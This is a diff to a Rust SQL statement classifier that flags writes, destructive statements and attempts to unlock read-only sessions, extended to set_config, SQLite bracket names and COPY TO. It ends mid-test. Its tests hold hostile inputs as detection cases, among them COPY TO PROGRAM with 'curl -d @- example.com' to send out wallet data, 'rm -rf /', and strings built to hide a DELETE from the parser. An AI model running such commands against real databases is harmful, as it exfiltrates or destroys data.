@@ -5,11 +5,12 @@
 //! (`'…'`, Postgres `E'…'` with its backslash escapes, `"…"`, `` `…` ``,
 //! `--` and nested `/* */` comments, Postgres `$tag$` bodies), so reads pay
 //! nothing measurable. Text it can't be sure of (a string, comment or
-//! dollar body that never ends, a nested comment, `\'` in a plain string:
-//! places where servers disagree) makes its statement a write, never a
-//! read. It guards against slips, not against a determined user:
-//! `SELECT delete_user(1)` reads as a read. Read-only connections are also
-//! read-only at the server, which catches those.
+//! dollar body that never ends, a nested comment, `\'` in a string, a
+//! SQLite `[…]` name that Postgres would read past its `]`: places where
+//! servers disagree) makes its statement a write, never a read. It guards
+//! against slips, not against a determined user: `SELECT delete_user(1)`
+//! reads as a read. Read-only connections are also read-only at the
+//! server, which catches those.
 
 use serde::{Deserialize, Serialize};
 
@@ -40,7 +41,8 @@ pub enum StatementKind {
     Read,
     /// SET, BEGIN, COMMIT, …: change nothing in the database.
     Session,
-    /// INSERT, UPDATE, DELETE, COPY FROM, CALL, and anything unrecognised.
+    /// INSERT, UPDATE, DELETE, COPY FROM, COPY TO a server file or program,
+    /// CALL, and anything unrecognised.
     Write,
     /// CREATE, ALTER, DROP, TRUNCATE, GRANT, …
     Schema,
@@ -57,9 +59,10 @@ pub struct StatementCheck {
     pub target: Option<String>,
     /// DROP, TRUNCATE, or DELETE / UPDATE with no WHERE.
     pub destructive: bool,
-    /// A session statement that would let later statements write (turning
+    /// A statement that would let later statements write (turning
     /// `transaction_read_only` off, `READ WRITE`, `RESET ALL`,
-    /// `PRAGMA query_only`). Refused on read-only connections.
+    /// `PRAGMA query_only`, `set_config` on those settings). Refused on
+    /// read-only connections.
     pub unlocks_writes: bool,
 }
 
@@ -116,12 +119,114 @@ pub fn check_sql(sql: &str) -> Vec<StatementCheck> {
     tokenize(sql)
         .iter()
         .filter(|s| !s.is_empty())
-        .map(|s| {
-            unclear_check(s)
-                .or_else(|| signal_check(s))
-                .unwrap_or_else(|| check_statement(s))
-        })
+        .map(|s| check_tokens(s))
         .collect()
+}
+
+/// One statement's check, from its tokens.
+fn check_tokens(toks: &[Tok]) -> StatementCheck {
+    let mut check = unclear_check(toks)
+        .or_else(|| signal_check(toks))
+        .unwrap_or_else(|| check_statement(toks));
+    if sets_read_only_config(toks) {
+        check.unlocks_writes = true;
+    }
+    check
+}
+
+/// Only reads, and calls no function: as far as its text can tell, running
+/// it changes nothing, so running it twice is the same as once. A read that
+/// calls one (`SELECT write_fn()`) may write, or turn the session's
+/// read-only default off from inside the function.
+pub fn plain_read(sql: &str) -> bool {
+    let statements: Vec<Vec<Tok>> = tokenize(sql)
+        .into_iter()
+        .filter(|s| !s.is_empty())
+        .collect();
+    !statements.is_empty()
+        && statements.iter().all(|toks| {
+            let check = check_tokens(toks);
+            check.kind == StatementKind::Read && !check.unlocks_writes && !calls_function(toks)
+        })
+}
+
+/// Words that stand before `(` without calling a function.
+const BEFORE_PARENS: &[&str] = &[
+    "ALL",
+    "AND",
+    "ANY",
+    "ARRAY",
+    "AS",
+    "BETWEEN",
+    "BY",
+    "DISTINCT",
+    "ELSE",
+    "EXCEPT",
+    "EXISTS",
+    "EXPLAIN",
+    "FILTER",
+    "FROM",
+    "GROUP",
+    "HAVING",
+    "ILIKE",
+    "IN",
+    "INTERSECT",
+    "IS",
+    "JOIN",
+    "LATERAL",
+    "LIKE",
+    "LIMIT",
+    "MATERIALIZED",
+    "NOT",
+    "OFFSET",
+    "ON",
+    "ONLY",
+    "OR",
+    "OVER",
+    "ROW",
+    "SELECT",
+    "SOME",
+    "THEN",
+    "UNION",
+    "USING",
+    "VALUES",
+    "WHEN",
+    "WHERE",
+];
+
+/// A name (bare or quoted) right before `(` that isn't a keyword taking
+/// parentheses: a function call, or what may be one (`AS t(a, b)` and
+/// `numeric(10, 2)` count too).
+fn calls_function(toks: &[Tok]) -> bool {
+    toks.windows(2).any(|w| {
+        w[1] == Tok::Open
+            && match &w[0] {
+                Tok::Word(word, _) => !BEFORE_PARENS.contains(&word.as_str()),
+                Tok::Quoted(_) => true,
+                _ => false,
+            }
+    })
+}
+
+/// Settings that keep a read-only session read-only.
+fn read_only_setting(name: &str) -> bool {
+    matches!(
+        name.to_ascii_lowercase().as_str(),
+        "transaction_read_only" | "default_transaction_read_only"
+    )
+}
+
+/// Calls `set_config` on a [`read_only_setting`], or on a setting the text
+/// doesn't name as a plain string (`set_config(name, …)`, `'…' || '…'`).
+fn sets_read_only_config(toks: &[Tok]) -> bool {
+    toks.windows(3).enumerate().any(|(k, w)| {
+        w[0].name().as_deref() == Some("SET_CONFIG")
+            && w[1] == Tok::Open
+            && match (&w[2], toks.get(k + 3)) {
+                (Tok::Str(Some(setting)), Some(Tok::Other(','))) => read_only_setting(setting),
+                _ => true,
+            }
+    })
 }
 
 /// What a statement whose text Rowkery can't be sure of counts as.
@@ -143,19 +248,18 @@ fn unclear_check(toks: &[Tok]) -> Option<StatementCheck> {
 /// SELECT, so the first word reads as a read; they count as writes.
 const SIGNAL_FUNCTIONS: &[&str] = &["PG_CANCEL_BACKEND", "PG_TERMINATE_BACKEND"];
 
-/// A statement that calls a [`SIGNAL_FUNCTIONS`] function anywhere in it.
+/// A statement that calls a [`SIGNAL_FUNCTIONS`] function anywhere in it,
+/// by its bare or quoted name.
 fn signal_check(toks: &[Tok]) -> Option<StatementCheck> {
-    let called = toks.windows(2).find_map(|w| match (&w[0], &w[1]) {
-        (Tok::Word(word, _), Tok::Open) if SIGNAL_FUNCTIONS.contains(&word.as_str()) => {
-            Some(word.as_str())
-        }
-        _ => None,
+    let called = toks.windows(2).find_map(|w| {
+        let name = w[0].name()?;
+        (w[1] == Tok::Open && SIGNAL_FUNCTIONS.contains(&name.as_str())).then_some(name)
     })?;
     Some(StatementCheck {
         kind: StatementKind::Write,
-        verb: called.to_string(),
-        target: None,
         destructive: called == "PG_TERMINATE_BACKEND",
+        verb: called,
+        target: None,
         unlocks_writes: false,
     })
 }
@@ -181,9 +285,7 @@ pub enum InTransaction {
 /// transaction (one tokenizing pass for both).
 pub fn check_file_statement(sql: &str) -> Option<(StatementCheck, InTransaction)> {
     let toks = tokenize(sql).into_iter().find(|s| !s.is_empty())?;
-    let check = unclear_check(&toks)
-        .or_else(|| signal_check(&toks))
-        .unwrap_or_else(|| check_statement(&toks));
+    let check = check_tokens(&toks);
     let words: Vec<&str> = top_level(&toks).filter_map(Tok::word).take(4).collect();
     let concurrently = || top_level(&toks).any(|t| t.is("CONCURRENTLY"));
     let role = match words.as_slice() {
@@ -257,6 +359,9 @@ enum Tok {
     Word(String, String),
     /// A double-quoted or backticked identifier, as written.
     Quoted(String),
+    /// A string: its value when the text says it plainly (closed, clear,
+    /// no `E` prefix and no backslash, which a server may read as escapes).
+    Str(Option<String>),
     Open,
     Close,
     Dot,
@@ -276,6 +381,23 @@ impl Tok {
     fn is(&self, w: &str) -> bool {
         self.word() == Some(w)
     }
+    /// A bare or quoted name, upper-cased: `"set_config"` is SET_CONFIG.
+    /// A quoted name matches whatever its case; a near miss only makes the
+    /// check stricter.
+    fn name(&self) -> Option<String> {
+        match self {
+            Tok::Word(w, _) => Some(w.clone()),
+            Tok::Quoted(text) if text.len() >= 2 => {
+                let q = &text[..1];
+                Some(
+                    text[1..text.len() - 1]
+                        .replace(&q.repeat(2), q)
+                        .to_ascii_uppercase(),
+                )
+            }
+            _ => None,
+        }
+    }
 }
 
 /// Statements (split on top-level `;`) as tokens. Strings, numbers and
@@ -294,7 +416,7 @@ fn tokenize_spans(sql: &str) -> (Vec<Vec<Tok>>, Vec<std::ops::Range<usize>>) {
     while let Some((lexeme, end)) = lex(b, i, true) {
         let toks = out.last_mut().unwrap();
         match lexeme {
-            Lexeme::String { clear } => push_string(toks, clear),
+            Lexeme::String { clear } => push_string(toks, clear, &sql[i..end]),
             Lexeme::Quoted { closed } => {
                 if !closed {
                     toks.push(Tok::Unclear);
@@ -316,6 +438,12 @@ fn tokenize_spans(sql: &str) -> (Vec<Vec<Tok>>, Vec<std::ops::Range<usize>>) {
             Lexeme::Open => toks.push(Tok::Open),
             Lexeme::Close => toks.push(Tok::Close),
             Lexeme::Dot => toks.push(Tok::Dot),
+            Lexeme::Bracket { clear } => {
+                if !clear {
+                    toks.push(Tok::Unclear);
+                }
+                toks.push(Tok::Other('['));
+            }
             Lexeme::Word => {
                 let text = &sql[i..end];
                 toks.push(Tok::Word(text.to_ascii_uppercase(), text.to_string()));
@@ -367,6 +495,12 @@ pub(crate) enum Lexeme {
     },
     /// A `$` that opens no body: nothing.
     Skip,
+    /// A `[`: a subscript to Postgres, a quoted name up to the first `]` to
+    /// SQLite. `clear` when both read the text up to that `]` alike
+    /// ([`bracket_clear`]); what follows is read as Postgres reads it.
+    Bracket {
+        clear: bool,
+    },
     Semicolon,
     Open,
     Close,
@@ -432,6 +566,18 @@ pub(crate) fn lex(b: &[u8], mut i: usize, eof: bool) -> Option<(Lexeme, usize)> 
                 None => done(Lexeme::Dollar { closed: false }, n, true),
             }
         }
+        b'[' => {
+            let to = n.min(i + 1 + BRACKET_SPAN);
+            let clear = match memchr::memchr(b']', &b[i + 1..to]) {
+                Some(p) => bracket_clear(&b[..i + 1 + p], i + 1),
+                // No `]` at all: SQLite refuses the text, Postgres reads a `[`.
+                None if to == n && eof => true,
+                None if to == n => return None,
+                // Longer than any name or subscript a person writes.
+                None => false,
+            };
+            Some((Lexeme::Bracket { clear }, i + 1))
+        }
         b';' => Some((Lexeme::Semicolon, i + 1)),
         b'(' => Some((Lexeme::Open, i + 1)),
         b')' => Some((Lexeme::Close, i + 1)),
@@ -463,11 +609,51 @@ pub(crate) fn lex(b: &[u8], mut i: usize, eof: bool) -> Option<(Lexeme, usize)> 
     }
 }
 
+/// How far past a `[` its `]` is looked for.
+const BRACKET_SPAN: usize = 1024;
+
+/// Whether Postgres reads `b[j..]`, the text between a `[` and the first
+/// `]` after it (which ends `b`), as SQLite does: as text that ends at that
+/// `]`, with no `;` and its parentheses balanced. SQLite takes all of it as
+/// one name. Postgres then ends no string, name, comment or body past the
+/// `]` and splits nothing inside it, so the tokens it sees there (a
+/// superset of SQLite's) are what gets checked. `[it's]` is a name to
+/// SQLite and opens a string to Postgres: not clear. Never recursive: a
+/// `[` inside is one more byte.
+fn bracket_clear(b: &[u8], mut j: usize) -> bool {
+    let mut depth = 0i32;
+    while j < b.len() {
+        if b[j] == b'[' {
+            j += 1;
+            continue;
+        }
+        let Some((lexeme, end)) = lex(b, j, true) else {
+            break;
+        };
+        match lexeme {
+            Lexeme::Open => depth += 1,
+            Lexeme::Close if depth == 0 => return false,
+            Lexeme::Close => depth -= 1,
+            // A `--` reaches the `]` unless a newline ends it first.
+            Lexeme::LineComment if end == b.len() => return false,
+            Lexeme::Semicolon
+            | Lexeme::String { clear: false }
+            | Lexeme::Quoted { closed: false }
+            | Lexeme::BlockComment { clear: false }
+            | Lexeme::Dollar { closed: false } => return false,
+            _ => {}
+        }
+        j = end;
+    }
+    depth == 0
+}
+
 /// Past the string opening at `b[i]` (a `'`), whether every server reads
 /// it the same way, and whether it closed. `''` is a quote; with `backslash`
-/// (an `E'…'` string) `\` escapes the next byte too. Unclear: it never ends, or a
-/// plain string holds `\'`, which Postgres with `standard_conforming_strings`
-/// off reads as a quote that doesn't end the string.
+/// (an `E'…'` string) `\` escapes the next byte too. Unclear: it never ends,
+/// or it holds `\'`. Postgres with `standard_conforming_strings` off reads
+/// that as a quote that doesn't end a plain string; SQLite, which has no
+/// `E'…'`, ends an `E'…'` string at it.
 fn skip_string(b: &[u8], mut i: usize, backslash: bool) -> (usize, bool, bool) {
     let n = b.len();
     let mut clear = true;
@@ -475,6 +661,9 @@ fn skip_string(b: &[u8], mut i: usize, backslash: bool) -> (usize, bool, bool) {
     while i < n {
         match b[i] {
             b'\\' if backslash => {
+                if b.get(i + 1) == Some(&b'\'') {
+                    clear = false;
+                }
                 i += 2;
                 continue;
             }
@@ -518,11 +707,16 @@ fn skip_block_comment(b: &[u8], mut i: usize) -> (usize, bool, bool) {
     (n, false, false)
 }
 
-fn push_string(toks: &mut Vec<Tok>, clear: bool) {
+fn push_string(toks: &mut Vec<Tok>, clear: bool, text: &str) {
     if !clear {
         toks.push(Tok::Unclear);
     }
-    toks.push(Tok::Other('\''));
+    let value = text
+        .strip_prefix('\'')
+        .and_then(|t| t.strip_suffix('\''))
+        .filter(|inner| clear && !inner.contains('\\'))
+        .map(|inner| inner.replace("''", "'"));
+    toks.push(Tok::Str(value));
 }
 
 /// Most statements one `propose_change` may hold.
@@ -620,7 +814,25 @@ pub fn identifiers(sql: &str) -> Vec<String> {
     out
 }
 
-const DATA_VERBS: &[&str] = &["INSERT", "UPDATE", "DELETE", "MERGE", "UPSERT", "REPLACE"];
+/// SQLite pragmas whose argument names what they read
+/// (`PRAGMA table_info(t)`); any other's argument sets it
+/// (`PRAGMA user_version(3)`).
+const PRAGMA_QUERIES: &[&str] = &[
+    "TABLE_INFO",
+    "TABLE_XINFO",
+    "TABLE_LIST",
+    "INDEX_INFO",
+    "INDEX_XINFO",
+    "INDEX_LIST",
+    "FOREIGN_KEY_LIST",
+    "FOREIGN_KEY_CHECK",
+    "INTEGRITY_CHECK",
+    "QUICK_CHECK",
+];
+
+/// SQLite pragmas that change the database even without a value:
+/// `optimize` runs ANALYZE, `incremental_vacuum` frees pages.
+const PRAGMA_ACTIONS: &[&str] = &["OPTIMIZE", "INCREMENTAL_VACUUM"];
 
 /// Object types that follow CREATE / ALTER / DROP (first word only).
 const OBJECT_TYPES: &[&str] = &[
@@ -692,14 +904,137 @@ const MODIFIERS: &[&str] = &[
     "QUICK",
 ];
 
-fn check_statement(toks: &[Tok]) -> StatementCheck {
-    // `(SELECT …) UNION …`: judge by the first word.
-    let lead = toks.iter().take_while(|t| **t == Tok::Open).count();
-    let toks = if lead < toks.len() {
-        &toks[lead..]
-    } else {
-        toks
+/// `EXPLAIN …` and `COPY (…) TO …` hold a statement of their own. They are
+/// taken off in a loop, never by recursion, in one pass: the text may
+/// repeat them thousands of times.
+fn check_statement(all: &[Tok]) -> StatementCheck {
+    // The statement looked at is `all[start..end]`.
+    let (mut start, mut end) = (0, all.len());
+    // Some(runs it) under an EXPLAIN; Some(to a file or program) under a COPY.
+    let mut explain: Option<bool> = None;
+    let mut copy_out: Option<bool> = None;
+    let mut closes: Vec<Option<usize>> = Vec::new();
+    let mut empty = None;
+    loop {
+        // `(SELECT …) UNION …`: judge by the first word.
+        let lead = all[start..end]
+            .iter()
+            .take_while(|t| **t == Tok::Open)
+            .count();
+        if start + lead < end {
+            start += lead;
+        }
+        let toks = &all[start..end];
+        match toks[0].word() {
+            Some("EXPLAIN") => {
+                let (analyze, at) = explain_options(toks);
+                explain = Some(explain.unwrap_or(false) || analyze);
+                start += at;
+            }
+            Some("COPY") if toks.get(1) == Some(&Tok::Open) => {
+                // `COPY (query) TO …`: the query may be a DML with RETURNING.
+                if closes.is_empty() {
+                    closes = closing_parens(all);
+                }
+                let Some(close) = closes[start + 1].filter(|&c| c < end) else {
+                    return write_verb("COPY");
+                };
+                let after = &all[close + 1..end];
+                if top_level(after).any(|t| t.is("FROM")) {
+                    return write_verb("COPY");
+                }
+                copy_out = Some(copy_out.unwrap_or(false) || copies_out(after));
+                start += 2;
+                end = close;
+            }
+            _ => break,
+        }
+        if start >= end {
+            empty = toks[0].word();
+            break;
+        }
+    }
+    let mut check = match empty {
+        // A wrapper with nothing in it: EXPLAIN reads, COPY fails closed.
+        Some("EXPLAIN") => StatementCheck {
+            kind: StatementKind::Read,
+            verb: "EXPLAIN".into(),
+            target: None,
+            destructive: false,
+            unlocks_writes: false,
+        },
+        Some(_) => write_verb("COPY"),
+        None => plain_check(&all[start..end]),
     };
+    if let Some(analyze) = explain {
+        // `EXPLAIN ANALYZE` runs its statement, so it is checked like the
+        // statement; any other EXPLAIN only plans it.
+        check = if analyze && check.changes_data() {
+            StatementCheck {
+                verb: format!("EXPLAIN ANALYZE {}", check.verb),
+                ..check
+            }
+        } else {
+            StatementCheck {
+                kind: StatementKind::Read,
+                verb: "EXPLAIN".into(),
+                target: None,
+                destructive: false,
+                unlocks_writes: false,
+            }
+        };
+    }
+    match copy_out {
+        Some(true) => write_verb("COPY"),
+        Some(false) if !check.changes_data() => StatementCheck {
+            verb: "COPY".into(),
+            ..check
+        },
+        _ => check,
+    }
+}
+
+/// A write known only by its verb.
+fn write_verb(verb: &str) -> StatementCheck {
+    StatementCheck {
+        kind: StatementKind::Write,
+        verb: verb.into(),
+        target: None,
+        destructive: false,
+        unlocks_writes: false,
+    }
+}
+
+/// For each `(` in `toks`, the index of the `)` that closes it.
+fn closing_parens(toks: &[Tok]) -> Vec<Option<usize>> {
+    let mut out = vec![None; toks.len()];
+    let mut open = Vec::new();
+    for (k, t) in toks.iter().enumerate() {
+        match t {
+            Tok::Open => open.push(k),
+            Tok::Close => {
+                if let Some(o) = open.pop() {
+                    out[o] = Some(k);
+                }
+            }
+            _ => {}
+        }
+    }
+    out
+}
+
+/// Whether a COPY's `TO …` (in `toks`, after its table or query) sends
+/// the rows anywhere but back to the client: a server file or a program
+/// the server runs. Those change something outside the database, so they
+/// count as writes, as `pg_terminate_backend` does; and a read-only
+/// transaction doesn't stop them. No `TO` at all fails closed.
+fn copies_out(toks: &[Tok]) -> bool {
+    let mut level = top_level(toks);
+    !(level.any(|t| t.is("TO")) && level.next().is_some_and(|t| t.is("STDOUT")))
+}
+
+/// A statement that isn't EXPLAIN or `COPY (…)`, by its first word.
+fn plain_check(toks: &[Tok]) -> StatementCheck {
     let first = toks[0].word().unwrap_or("");
     let session = |unlocks: bool| StatementCheck {
         kind: StatementKind::Session,
@@ -725,31 +1060,43 @@ fn check_statement(toks: &[Tok]) -> StatementCheck {
             }
         }
         "WITH" => {
-            // A data-modifying CTE or main statement makes the whole run a write.
-            match toks
-                .iter()
-                .position(|t| t.word().is_some_and(|w| DATA_VERBS[..4].contains(&w)))
-            {
-                Some(p) => data_check(toks, toks[p].word().unwrap(), p),
+            // A data-modifying CTE or main statement makes the whole run a
+            // write, and so do `… SELECT … INTO new_table` (Postgres) and
+            // `… REPLACE INTO t` (SQLite; `replace(…)` is a function).
+            let found = toks.iter().enumerate().find_map(|(p, t)| {
+                let verb = match t.word()? {
+                    w @ ("INSERT" | "UPDATE" | "DELETE" | "MERGE") => w,
+                    "REPLACE" if toks.get(p + 1).is_some_and(|t| t.is("INTO")) => "REPLACE",
+                    "INTO" => "SELECT INTO",
+                    _ => return None,
+                };
+                Some((p, verb))
+            });
+            match found {
+                Some((p, verb)) => data_check(toks, verb, p),
                 None => read(),
             }
         }
-        "EXPLAIN" => explain_check(toks),
         "SHOW" | "VALUES" | "TABLE" | "FETCH" | "MOVE" | "DECLARE" | "CLOSE" | "LISTEN"
         | "UNLISTEN" | "DESCRIBE" | "DESC" => read(),
         "PRAGMA" => {
-            // `PRAGMA x` and `PRAGMA table_info(t)` read; `PRAGMA x = v` sets.
+            // `PRAGMA [schema.]name`, then `= value` or `(value)` to set it,
+            // except for the pragmas whose argument names what they read.
+            let at = if toks.get(2) == Some(&Tok::Dot) { 3 } else { 1 };
+            let name = match toks.get(at) {
+                Some(Tok::Str(Some(s))) => s.to_ascii_uppercase(),
+                Some(t) => t.name().unwrap_or_default(),
+                None => String::new(),
+            };
             let sets = toks.contains(&Tok::Other('='));
-            if toks.iter().any(|t| t.is("QUERY_ONLY")) && (sets || toks.contains(&Tok::Open)) {
+            let arg = toks.contains(&Tok::Open);
+            if name == "QUERY_ONLY" && (sets || arg) {
                 session(true)
-            } else if sets {
-                StatementCheck {
-                    kind: StatementKind::Write,
-                    verb: "PRAGMA".into(),
-                    target: None,
-                    destructive: false,
-                    unlocks_writes: false,
-                }
+            } else if sets
+                || (arg && !PRAGMA_QUERIES.contains(&name.as_str()))
+                || PRAGMA_ACTIONS.contains(&name.as_str())
+            {
+                write_verb("PRAGMA")
             } else {
                 read()
             }
@@ -762,8 +1109,8 @@ fn check_statement(toks: &[Tok]) -> StatementCheck {
             data_check(toks, first, 0)
         }
         "COPY" => {
-            // `COPY t TO …` / `COPY (SELECT …) TO …` reads.
-            if top_level(toks).any(|t| t.is("FROM")) {
+            // `COPY t TO STDOUT` reads; `COPY (…)` is taken off before this.
+            if top_level(toks).any(|t| t.is("FROM")) || copies_out(toks) {
                 data_check(toks, "COPY", 0)
             } else {
                 read()
@@ -877,17 +1224,20 @@ fn schema_check(toks: &[Tok], first: &str) -> StatementCheck {
     }
 }
 
-/// `EXPLAIN ANALYZE` runs its statement, so it is checked like the statement.
-fn explain_check(toks: &[Tok]) -> StatementCheck {
+/// Whether the `EXPLAIN` starting `toks` runs its statement (ANALYZE), and
+/// where in `toks` the statement starts.
+fn explain_options(toks: &[Tok]) -> (bool, usize) {
     let mut i = 1;
     let mut analyze = false;
     if toks.get(1) == Some(&Tok::Open) {
-        // EXPLAIN (ANALYZE, BUFFERS) …; `ANALYZE false` / `off` doesn't run it.
+        // EXPLAIN (ANALYZE, BUFFERS) …; `ANALYZE false` / `off` doesn't run
+        // it. Options that never close leave no statement.
         let close = toks
             .iter()
+            .skip(2)
             .position(|t| *t == Tok::Close)
-            .unwrap_or(toks.len() - 1);
-        let opts = &toks[2..close];
+            .map_or(toks.len(), |p| p + 2);
+        let opts = toks.get(2..close).unwrap_or_default();
         analyze = opts.iter().enumerate().any(|(k, t)| {
             (t.is("ANALYZE") || t.is("ANALYSE"))
                 && !opts
@@ -905,26 +1255,13 @@ fn explain_check(toks: &[Tok]) -> StatementCheck {
             i += 1;
         }
     }
-    let inner = (i < toks.len()).then(|| check_statement(&toks[i..]));
-    if let Some(inner) = inner.filter(|c| analyze && c.changes_data()) {
-        StatementCheck {
-            verb: format!("EXPLAIN ANALYZE {}", inner.verb),
-            ..inner
-        }
-    } else {
-        StatementCheck {
-            kind: StatementKind::Read,
-            verb: "EXPLAIN".into(),
-            target: None,
-            destructive: false,
-            unlocks_writes: false,
-        }
-    }
+    (analyze, i.min(toks.len()))
 }
 
-/// Session statements that would let a read-only session write.
+/// Statements that would let a read-only session write. Setting names
+/// match quoted too: `SET "default_transaction_read_only" = off`.
 fn unlocks_writes(first: &str, toks: &[Tok]) -> bool {
-    let has = |w: &str| toks.iter().any(|t| t.is(w));
+    let has = |w: &str| toks.iter().any(|t| t.name().as_deref() == Some(w));
     let read_write = toks.windows(2).any(|p| p[0].is("READ") && p[1].is("WRITE"));
     match first {
         "SET" | "RESET" => {
@@ -1313,14 +1650,15 @@ mod tests {
     #[test]
     fn escape_strings_take_backslashes() {
         use StatementKind::*;
-        // `E'\''` is one quote, so the `;` after it splits.
-        assert_eq!(kinds("SELECT E'\\''; DELETE FROM t"), [Read, Write]);
-        assert_eq!(kinds("SELECT e'\\''; DELETE FROM t"), [Read, Write]);
+        // `E'\''` is one quote to Postgres, so the `;` after it splits; SQLite
+        // has no E'…' and ends the string at `\'`, so it is unclear.
+        assert_eq!(kinds("SELECT E'\\''; DELETE FROM t"), [Write, Write]);
+        assert_eq!(one("SELECT e'\\''").verb, UNCLEAR_VERB);
         // `\\` is one backslash; `''` is still a quote inside E'…'.
         assert_eq!(kinds("SELECT E'\\\\'; DELETE FROM t"), [Read, Write]);
         assert_eq!(kinds("SELECT E'it''s; \\n'; DELETE FROM t"), [Read, Write]);
         // An escaped quote keeps the string open across a `;`.
-        assert_eq!(kinds("SELECT E'\\'; DELETE FROM t; \\''"), [Read]);
+        assert_eq!(kinds("SELECT E'\\'; DELETE FROM t; \\''"), [Write]);
         // A word ending in E is not a prefix; U&'…' is plain quoting.
         assert_eq!(kinds("SELECT the'x'; DELETE FROM t"), [Read, Write]);
         assert_eq!(kinds("SELECT U&'d\\0061t'; DELETE FROM t"), [Read, Write]);
@@ -1394,7 +1732,7 @@ mod tests {
         assert!(checks.iter().any(|c| c.verb == "DELETE" && c.destructive));
         assert!(checks.iter().any(|c| c.unlocks_writes));
         let held = hold_for(SafeMode::Confirm, sql, false).unwrap();
-        assert_eq!(held.statements[0].verb, "DELETE");
+        assert!(held.statements.iter().any(|c| c.verb == "DELETE"));
         assert_eq!(
             hold_for(SafeMode::ReadOnly, sql, true).unwrap().action,
             HoldAction::Refuse
@@ -1407,14 +1745,256 @@ mod tests {
             assert!(hold_for(SafeMode::Confirm, sql, false).is_some(), "{sql}");
         }
 
-        // The `--` swallows the WHERE: this UPDATE changes every row.
-        let sql = "UPDATE t SET a = E'\\'' -- ' WHERE id = 1 '";
-        assert!(one(sql).destructive);
-        let changes = row_changes(sql).unwrap();
-        assert!(changes[0].destructive);
-        // Without the E, `\'` is unclear and the proposal is refused.
-        assert!(row_changes("UPDATE t SET a = '\\'' -- ' WHERE id = 1 '").is_err());
-        // A real WHERE after an E-string still counts.
-        assert!(!one("UPDATE t SET a = E'\\'' WHERE id = 1").destructive);
+        // The `--` swallows the WHERE to Postgres, while SQLite ends the
+        // string at `\'`: unclear either way, so held and never proposed.
+        for sql in [
+            "UPDATE t SET a = E'\\'' -- ' WHERE id = 1 '",
+            "UPDATE t SET a = '\\'' -- ' WHERE id = 1 '",
+        ] {
+            assert_eq!(one(sql).verb, UNCLEAR_VERB, "{sql}");
+            assert!(row_changes(sql).is_err(), "{sql}");
+        }
+        // An E-string without `\'` reads as itself, its WHERE included.
+        assert!(!one("UPDATE t SET a = E'\\\\' WHERE id = 1").destructive);
+        assert!(one("UPDATE t SET a = E'\\\\' -- ' WHERE id = 1").destructive);
+    }
+
+    /// reports#12: each of these read as a read.
+    #[test]
+    fn read_only_settings_set_from_a_select_unlock_writes() {
+        for sql in [
+            "SELECT set_config('default_transaction_read_only','off',false)",
+            "select pg_catalog.set_config('transaction_read_only', 'off', true)",
+            "SELECT \"set_config\"('DEFAULT_TRANSACTION_READ_ONLY', 'off', false)",
+            // A name the text doesn't spell out fails closed.
+            "SELECT set_config('default_transaction_' || 'read_only', 'off', false)",
+            "SELECT set_config(name, 'off', false) FROM pg_settings",
+            "SELECT set_config(E'default_transaction_read_onl\\y', 'off', false)",
+            "SET \"default_transaction_read_only\" = off",
+            "RESET \"transaction_read_only\"",
+        ] {
+            let c = one(sql);
+            assert!(c.unlocks_writes, "{sql}");
+            assert!(hold_for(SafeMode::ReadOnly, sql, true).is_some(), "{sql}");
+            assert!(!plain_read(sql), "{sql}");
+        }
+        // Other settings are fine, and Confirm writes lets them all run.
+        let sql = "SELECT set_config('search_path', 'app', false)";
+        assert!(!one(sql).unlocks_writes);
+        assert_eq!(hold_for(SafeMode::ReadOnly, sql, false), None);
+        assert_eq!(
+            hold_for(
+                SafeMode::Confirm,
+                "SELECT set_config('default_transaction_read_only','off',false)",
+                false
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn sqlite_bracket_names_are_read_like_sqlite() {
+        // `[it's]` is a name to SQLite and opens a string to Postgres, which
+        // would hide the DELETE that SQLite runs.
+        let sql = "WITH a AS (SELECT 1 AS [it's]) DELETE FROM t --']";
+        assert_eq!(one(sql).verb, UNCLEAR_VERB);
+        assert!(hold_for(SafeMode::Confirm, sql, false).is_some());
+        for sql in [
+            "SELECT [a;b] FROM t",
+            "SELECT [a--] FROM t",
+            "SELECT [a/*] FROM t; */",
+            "SELECT [a\"b] FROM t",
+            "SELECT [$x$] FROM t WHERE [$x$]",
+            "SELECT [(] FROM t",
+            "SELECT [)] INTO t FROM s",
+        ] {
+            assert_eq!(check_sql(sql)[0].verb, UNCLEAR_VERB, "{sql}");
+            assert!(hold_for(SafeMode::Confirm, sql, false).is_some(), "{sql}");
+        }
+        let long = format!("SELECT [{}] FROM t", "x".repeat(BRACKET_SPAN + 1));
+        assert_eq!(kind(&long), StatementKind::Write);
+        // Names and subscripts both servers read alike stay reads.
+        for sql in [
+            "SELECT [Order Id], [x-y] FROM [My Table]",
+            "SELECT arr[1], arr[2:3], m['key'], a[b[1]] FROM t",
+            "SELECT a[f(x)] FROM t",
+            "SELECT [a--\n] FROM t",
+            "SELECT ARRAY[1, 2]",
+            "SELECT 1 [",
+        ] {
+            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
+        }
+        // What's inside a clear one is still checked.
+        assert_eq!(
+            kind("SELECT a[pg_terminate_backend(1)] FROM t"),
+            StatementKind::Write
+        );
+        assert_eq!(
+            kinds("SELECT [x]; DELETE FROM t"),
+            [StatementKind::Read, StatementKind::Write]
+        );
+    }
+
+    #[test]
+    fn copy_to_a_file_or_program_is_a_write() {
+        for sql in [
+            "COPY wallets TO PROGRAM 'curl -d @- example.com'",
+            "COPY wallets TO '/tmp/w.csv'",
+            "copy (SELECT * FROM wallets) to '/tmp/w.csv' WITH (FORMAT csv)",
+            "COPY (SELECT 1) TO PROGRAM 'rm -rf /'",
+            // The query in COPY (…) may be a write with RETURNING.
+            "COPY (DELETE FROM t RETURNING *) TO STDOUT",
+            "COPY ((UPDATE t SET a = 1 RETURNING *)) TO STDOUT",
+            "COPY wallets",
+            "COPY (SELECT 1",
+        ] {
+            assert_eq!(kind(sql), StatementKind::Write, "{sql}");
+        }
+        assert_eq!(
+            one("COPY wallets TO '/tmp/w'").target.as_deref(),
+            Some("wallets")
+        );
+        assert!(one("COPY (DELETE FROM t RETURNING *) TO STDOUT").destructive);
+        for sql in [
+            "COPY wallets TO STDOUT",
+            "copy wallets (id, balance) to stdout with (format csv, header)",
+            "COPY (SELECT * FROM t WHERE a IN (1, 2)) TO STDOUT",
+        ] {
+            assert_eq!(kind(sql), StatementKind::Read, "{sql}");
+            assert_eq!(one(sql).verb, "COPY", "{sql}");
+        }
+    }
+
+    #[test]
+    fn with_replace_into_and_select_into_are_writes() {
+        for (sql, verb, target) in [
+            (
